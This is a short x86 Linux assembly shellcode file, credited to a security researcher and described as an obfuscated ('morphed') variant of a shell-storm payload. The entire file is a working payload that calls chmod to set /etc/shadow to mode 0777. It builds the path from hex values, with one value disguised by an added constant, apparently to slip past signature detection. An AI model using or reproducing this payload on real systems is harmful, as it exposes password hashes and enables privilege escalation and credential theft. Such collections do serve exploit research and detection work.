; Content:	morphed code (chmod 0777 /etc/shadow) from http://shell-storm.org/shellcode/files/shellcode-590.php
; Author: 	Florian Hansemann | @HanseSecure | https://hansesecure.de
; Date: 	10/2017
;


global _start

_start:
	xor eax,eax
	push eax
	mov al, 0xf
	mov ecx, 0x443C312E ; ecx	= 0x776f6461 - 0x33333333
	add ecx, 0x33333333 
	push ecx
	push 0x68732f63
	push 0x74652f2f
	mov ebx, esp
	xor ecx, ecx
	mov cx, 0x1ff
	int 0x80
	inc eax
	int 0x80

